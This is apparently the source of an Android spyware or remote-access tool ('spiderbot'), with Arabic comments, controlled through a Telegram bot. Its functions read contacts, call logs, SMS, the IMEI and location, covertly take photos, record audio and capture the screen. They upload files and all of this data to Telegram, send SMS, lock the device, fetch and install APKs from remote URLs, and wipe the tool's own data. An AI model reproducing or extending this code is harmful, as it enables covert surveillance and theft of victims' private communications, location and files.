package com.spiderbot;

import android.Manifest;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.Camera;
import android.hardware.camera2.CameraManager;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class DeviceUtils {
    
    // ========== 1. جهات الاتصال ==========
    public static String getContacts(Context ctx) {
        StringBuilder sb = new StringBuilder("📞 *جهات الاتصال:*\n");
        try {
            Cursor c = ctx.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
            if (c != null) {
                int count = 0;
                while (c.moveToNext() && count < 100) {
                    String name = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String num = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append("👤 ").append(name != null ? name : "بدون اسم").append(": ").append(num).append("\n");
                    count++;
                }
                c.close();
            }
        } catch (Exception e) { sb.append("خطأ: ").append(e.getMessage()); }
        return sb.toString();
    }

    // ========== 2. سجل المكالمات ==========
    public static String getCallLog(Context ctx) {
        StringBuilder sb = new StringBuilder("📋 *سجل المكالمات (آخر 50):*\n");
        try {
            Cursor c = ctx.getContentResolver().query(
                CallLog.Calls.CONTENT_URI, null, null, null,
                CallLog.Calls.DATE + " DESC LIMIT 50");
            if (c != null) {
                while (c.moveToNext()) {
                    String num = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));
                    String name = c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    int type = c.getInt(c.getColumnIndex(CallLog.Calls.TYPE));
                    long dur = c.getLong(c.getColumnIndex(CallLog.Calls.DURATION));
                    long date = c.getLong(c.getColumnIndex(CallLog.Calls.DATE));
                    String typeStr = type == 1 ? "📞 وارد" : type == 2 ? "📤 صادر" : "❌ فائت";
                    String contact = (name != null && !name.isEmpty()) ? name : num;
                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm");
                    sb.append(typeStr).append(" ").append(contact).append("\n   📱 ").append(num)
                      .append("\n   ⏱ ").append(dur).append(" ثانية")
                      .append("\n   🕐 ").append(sdf.format(new Date(date))).append("\n\n");
                }
                c.close();
            }
        } catch (Exception e) { sb.append("خطأ: ").append(e.getMessage()); }
        return sb.toString();
    }

    // ========== 3. الرسائل النصية SMS ==========
    public static String getSMS(Context ctx) {
        StringBuilder sb = new StringBuilder("💬 *الرسائل النصية (آخر 50):*\n");
        try {
            Cursor c = ctx.getContentResolver().query(
                Uri.parse("content://sms/"), null, null, null,
                "date DESC LIMIT 50");
            if (c != null) {
                while (c.moveToNext()) {
                    String addr = c.getString(c.getColumnIndex("address"));
                    String body = c.getString(c.getColumnIndex("body"));
                    long date = c.getLong(c.getColumnIndex("date"));
                    int type = c.getInt(c.getColumnIndex("type"));
                    String typeStr = type == 1 ? "📩 وارد" : type == 2 ? "📤 صادر" : "❓ غير معروف";
                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm");
                    sb.append(typeStr).append(" من: ").append(addr).append("\n")
                      .append("   🕐 ").append(sdf.format(new Date(date))).append("\n")
                      .append("   📝 ").append(body.length() > 150 ? body.substring(0,150)+"..." : body).append("\n\n");
                }
                c.close();
            }
        } catch (Exception e) { sb.append("خطأ: ").append(e.getMessage()); }
        return sb.toString();
    }

    // ========== 4. إرسال SMS ==========
    public static void sendSMS(Context ctx, String number, String message) {
        try {
            SmsManager.getDefault().sendTextMessage(number, null, message, null, null);
            TelegramAPI.sendMessage("✅ تم إرسال الرسالة إلى " + number);
        } catch (Exception e) {
            TelegramAPI.sendMessage("❌ فشل الإرسال: " + e.getMessage());
        }
    }

    // ========== 5. معلومات الجهاز ==========
    public static String getDeviceInfo(Context ctx) {
        StringBuilder sb = new StringBuilder("📱 *معلومات الجهاز:*\n");
        sb.append("الموديل: ").append(Build.MODEL).append("\n");
        sb.append("الشركة: ").append(Build.MANUFACTURER).append("\n");
        sb.append("أندرويد: ").append(Build.VERSION.RELEASE).append("\n");
        sb.append("API: ").append(Build.VERSION.SDK_INT).append("\n");
        sb.append("المعرف: ").append(Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID)).append("\n");
        try {
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (ctx.checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                    sb.append("IMEI: ").append(tm.getImei()).append("\n");
                }
            }
        } catch (Exception ignored) {}
        return sb.toString();
    }

    // ========== 6. البطارية ==========
    public static String getBattery(Context ctx) {
        try {
            android.content.IntentFilter filter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
            android.content.Intent battery = ctx.registerReceiver(null, filter);
            int level = battery.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, 0);
            int scale = battery.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, 100);
            int temp = battery.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, 0) / 10;
            int voltage = battery.getIntExtra(android.os.BatteryManager.EXTRA_VOLTAGE, 0);
            boolean charging = battery.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) == android.os.BatteryManager.BATTERY_STATUS_CHARGING;
            return "🔋 *البطارية:* " + (level * 100 / scale) + "%\n" +
                   "🌡️ الحرارة: " + temp + "°C\n" +
                   "⚡ فولت: " + voltage + "mV\n" +
                   (charging ? "🔌 يتم الشحن" : "🔋 غير مشحون");
        } catch (Exception e) { return "خطأ: " + e.getMessage(); }
    }

    // ========== 7. الواي فاي ==========
    public static String getWifi(Context ctx) {
        try {
            WifiManager wm = (WifiManager) ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            String ssid = wm.getConnectionInfo().getSSID();
            int rssi = wm.getConnectionInfo().getRssi();
            int level = android.net.wifi.WifiManager.calculateSignalLevel(rssi, 4);
            return "📶 *WiFi:* " + (ssid != null ? ssid : "غير متصل") + "\n📊 القوة: " + level + "/4 (" + rssi + " dBm)";
        } catch (Exception e) { return "خطأ: " + e.getMessage(); }
    }

    // ========== 8. الموقع الجغرافي ==========
    public static void getLocation(Context ctx, LocationCallback cb) {
        try {
            LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                String addr = "";
                try {
                    Geocoder geocoder = new Geocoder(ctx, Locale.getDefault());
                    List<Address> addresses = geocoder.getFromLocation(loc.getLatitude(), loc.getLongitude(), 1);
                    if (addresses != null && !addresses.isEmpty()) {
                        addr = addresses.get(0).getAddressLine(0);
                    }
                } catch (Exception ignored) {}
                cb.onResult("📍 *الموقع:*\n" +
                    "الخط: " + loc.getLatitude() + "\n" +
                    "الطول: " + loc.getLongitude() + "\n" +
                    "الدقة: ±" + loc.getAccuracy() + " متر\n" +
                    (addr.isEmpty() ? "" : "العنوان: " + addr + "\n") +
                    "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude());
            } else {
                cb.onResult("❌ لا يمكن تحديد الموقع");
            }
        } catch (Exception e) { cb.onResult("خطأ: " + e.getMessage()); }
    }
    public interface LocationCallback { void onResult(String result); }

    // ========== 9. كاميرا (تصوير) ==========
    public static void takePhoto(Context ctx, boolean front, PhotoCallback cb) {
        try {
            int id = front ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK;
            Camera cam = Camera.open(id);
            cam.takePicture(null, null, (data, camera) -> {
                try {
                    File f = new File(ctx.getCacheDir(), "spider_" + System.currentTimeMillis() + ".jpg");
                    FileOutputStream fos = new FileOutputStream(f);
                    fos.write(data);
                    fos.close();
                    TelegramAPI.sendFile(f, "📸 صورة" + (front ? " أمامية" : " خلفية"));
                    cb.onResult(f, "تم");
                } catch (Exception e) { cb.onResult(null, e.getMessage()); }
                camera.release();
            });
        } catch (Exception e) { cb.onResult(null, e.getMessage()); }
    }
    public interface PhotoCallback { void onResult(File file, String msg); }

    // ========== 10. تسجيل صوت ==========
    private static MediaRecorder audioRecorder;
    private static String audioPath;
    
    public static void startRecording(Context ctx) {
        try {
            audioPath = ctx.getCacheDir() + "/audio_" + System.currentTimeMillis() + ".mp4";
            audioRecorder = new MediaRecorder();
            audioRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            audioRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            audioRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            audioRecorder.setOutputFile(audioPath);
            audioRecorder.prepare();
            audioRecorder.start();
            TelegramAPI.sendMessage("🎤 بدأ التسجيل الصوتي");
        } catch (Exception e) { TelegramAPI.sendMessage("❌ فشل التسجيل: " + e.getMessage()); }
    }
    
    public static void stopRecording() {
        try {
            if (audioRecorder != null) {
                audioRecorder.stop();
                audioRecorder.release();
                audioRecorder = null;
                File f = new File(audioPath);
                if (f.exists()) TelegramAPI.sendFile(f, "🎤 تسجيل صوتي");
                TelegramAPI.sendMessage("⏹️ تم إيقاف التسجيل");
            }
        } catch (Exception e) { TelegramAPI.sendMessage("❌ خطأ: " + e.getMessage()); }
    }

    // ========== 11. لقطة شاشة ==========
    public static void takeScreenshot(Context ctx) {
        try {
            Process p = Runtime.getRuntime().exec("su -c screencap -p /sdcard/spider_screen.png");
            p.waitFor();
            File f = new File("/sdcard/spider_screen.png");
            if (f.exists() && f.length() > 0) {
                TelegramAPI.sendFile(f, "🖥️ لقطة شاشة");
            } else {
                TelegramAPI.sendMessage("❌ فشلت لقطة الشاشة (قد تحتاج صلاحيات root)");
            }
        } catch (Exception e) { TelegramAPI.sendMessage("❌ " + e.getMessage()); }
    }

    // ========== 12. اهتزاز ==========
    public static void vibrate(Context ctx) {
        Vibrator v = (Vibrator) ctx.getSystemService(Context.VIBRATOR_SERVICE);
        if (v != null) { v.vibrate(2000); TelegramAPI.sendMessage("📳 تم الاهتزاز"); }
        else TelegramAPI.sendMessage("❌ الاهتزاز غير مدعوم");
    }

    // ========== 13. قفل الشاشة ==========
    public static void lockScreen(Context ctx) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(ctx, AdminReceiver.class);
            if (dpm.isAdminActive(admin)) { 
                dpm.lockNow(); 
                TelegramAPI.sendMessage("🔒 تم قفل الشاشة"); 
            } else { 
                TelegramAPI.sendMessage("❌ لم يتم تفعيل مسؤول الجهاز"); 
            }
        } catch (Exception e) { TelegramAPI.sendMessage("❌ " + e.getMessage()); }
    }

    // ========== 14. فلاش (كشاف) ==========
    private static boolean isFlashOn = false;
    
    public static void toggleFlash(Context ctx) {
        try {
            CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            String id = cm.getCameraIdList()[0];
            isFlashOn = !isFlashOn;
            cm.setTorchMode(id, isFlashOn);
            TelegramAPI.sendMessage(isFlashOn ? "💡 تم تشغيل الفلاش" : "💡 تم إطفاء الفلاش");
        } catch (Exception e) { TelegramAPI.sendMessage("❌ " + e.getMessage()); }
    }

    // ========== 15. وضع الطيران ==========
    public static void airplaneMode(Context ctx) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
            boolean isEnabled = Settings.Global.getInt(ctx.getContentResolver(), Settings.Global.AIRPLANE_MODE_ON, 0) == 1;
            Settings.Global.putInt(ctx.getContentResolver(), Settings.Global.AIRPLANE_MODE_ON, isEnabled ? 0 : 1);
            android.content.Intent intent = new android.content.Intent(android.content.Intent.ACTION_AIRPLANE_MODE_CHANGED);
            intent.putExtra("state", !isEnabled);
            ctx.sendBroadcast(intent);
            TelegramAPI.sendMessage(isEnabled ? "✈️ إيقاف وضع الطيران" : "✈️ تفعيل وضع الطيران");
        }
    }

    // ========== 16. قائمة الملفات ==========
    public static String listFiles(String path) {
        StringBuilder sb = new StringBuilder("📂 *الملفات في:* " + path + "\n");
        try {
            File dir = new File(path);
            if (!dir.exists()) return "المسار غير موجود";
            File[] files = dir.listFiles();
            if (files != null && files.length > 0) {
                for (int i = 0; i < Math.min(40, files.length); i++) {
                    String icon = files[i].isDirectory() ? "📁 " : "📄 ";
                    String size = "";
                    if (files[i].isFile()) {
                        long s = files[i].length();
                        if (s < 1024) size = " (" + s + " B)";
                        else if (s < 1024*1024) size = " (" + (s/1024) + " KB)";
                        else size = " (" + (s/(1024*1024)) + " MB)";
                    }
                    sb.append(icon).append(files[i].getName()).append(size).append("\n");
                }
            } else {
                sb.append("المجلد فارغ");
            }
        } catch (Exception e) { sb.append("خطأ: ").append(e.getMessage()); }
        return sb.toString();
    }

    // ========== 17. رفع ملف إلى التلغرام ==========
    public static void uploadFile(String path) {
        File f = new File(path);
        if (f.exists() && f.isFile()) {
            TelegramAPI.sendFile(f, "📎 ملف: " + f.getName());
        } else {
            TelegramAPI.sendMessage("❌ الملف غير موجود: " + path);
        }
    }

    // ========== 18. التطبيقات المثبتة ==========
    public static String getApps(Context ctx) {
        StringBuilder sb = new StringBuilder("📱 *التطبيقات المثبتة:*\n");
        try {
            android.content.pm.PackageManager pm = ctx.getPackageManager();
            List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(0);
            int count = 0;
            for (android.content.pm.PackageInfo pkg : packages) {
                if (count < 60) {
                    String appName = pkg.applicationInfo.loadLabel(pm).toString();
                    sb.append("📱 ").append(appName).append("\n");
                    count++;
                } else {
                    sb.append("... و " + (packages.size() - 60) + " تطبيق آخر");
                    break;
                }
            }
        } catch (Exception e) { sb.append("خطأ: ").append(e.getMessage()); }
        return sb.toString();
    }

    // ========== 19. حذف تطبيق ==========
    public static void uninstallApp(Context ctx, String pkg) {
        try {
            Intent intent = new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + pkg));
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
            TelegramAPI.sendMessage("🗑️ تم فتح شاشة حذف التطبيق: " + pkg);
        } catch (Exception e) {
            TelegramAPI.sendMessage("❌ فشل فتح شاشة الحذف: " + e.getMessage());
        }
    }

    // ========== 20. تثبيت تطبيق من رابط ==========
    public static void installApk(Context ctx, String url) {
        TelegramAPI.sendMessage("📥 جاري تحميل APK من: " + url);
        new Thread(() -> {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setConnectTimeout(15000);
                conn.connect();
                File apkFile = new File(ctx.getCacheDir(), "spider_install_" + System.currentTimeMillis() + ".apk");
                FileOutputStream fos = new FileOutputStream(apkFile);
                InputStream is = conn.getInputStream();
                byte[] buffer = new byte[4096];
                int len;
                while ((len = is.read(buffer)) != -1) {
                    fos.write(buffer, 0, len);
                }
                fos.close();
                is.close();
                conn.disconnect();
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
                ctx.startActivity(intent);
                TelegramAPI.sendMessage("✅ تم فتح شاشة التثبيت");
            } catch (Exception e) {
                TelegramAPI.sendMessage("❌ فشل التحميل/التثبيت: " + e.getMessage());
            }
        }).start();
    }

    // ========== 21. تحميل وسائط (صورة/فيديو) ==========
    public static void downloadMedia(Context ctx, String url) {
        TelegramAPI.sendMessage("📥 جاري تحميل الوسائط من: " + url);
        new Thread(() -> {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setConnectTimeout(15000);
                conn.connect();
                String fileName = "spider_" + System.currentTimeMillis();
                if (url.contains(".mp4") || url.contains(".mov") || url.contains(".3gp")) {
                    fileName += ".mp4";
                } else {
                    fileName += ".jpg";
                }
                File downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                if (!downloadDir.exists()) downloadDir.mkdirs();
                File outFile = new File(downloadDir, fileName);
                FileOutputStream fos = new FileOutputStream(outFile);
                InputStream is = conn.getInputStream();
                byte[] buffer = new byte[4096];
                int len;
                while ((len = is.read(buffer)) != -1) {
                    fos.write(buffer, 0, len);
                }
                fos.close();
                is.close();
                conn.disconnect();
                TelegramAPI.sendMessage("✅ تم التحميل وحفظه في:\n" + outFile.getAbsolutePath());
            } catch (Exception e) {
                TelegramAPI.sendMessage("❌ فشل التحميل: " + e.getMessage());
            }
        }).start();
    }

    // ========== 22. قراءة ملف نصي ==========
    public static void readTextFile(String path) {
        try {
            File f = new File(path);
            if (!f.exists()) {
                TelegramAPI.sendMessage("❌ الملف غير موجود: " + path);
                return;
            }
            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.FileReader(f));
            StringBuilder content = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null && content.length() < 3000) {
                content.append(line).append("\n");
            }
            reader.close();
            TelegramAPI.sendMessage("📄 *محتوى الملف:*\n" + content.toString());
        } catch (Exception e) {
            TelegramAPI.sendMessage("❌ خطأ في القراءة: " + e.getMessage());
        }
    }

    // ========== 23. تدمير التطبيق ==========
    public static void destroyApp(Context ctx) {
        TelegramAPI.sendMessage("💀 جاري تدمير بيانات التطبيق...");
        try {
            ctx.getCacheDir().delete();
            ctx.getFilesDir().delete();
            ctx.getSharedPreferences("spider_prefs", 0).edit().clear().commit();
            TelegramAPI.sendMessage("💀 تم تدمير بيانات التطبيق");
        } catch (Exception e) {
            TelegramAPI.sendMessage("❌ فشل التدمير: " + e.getMessage());
        }
    }
}
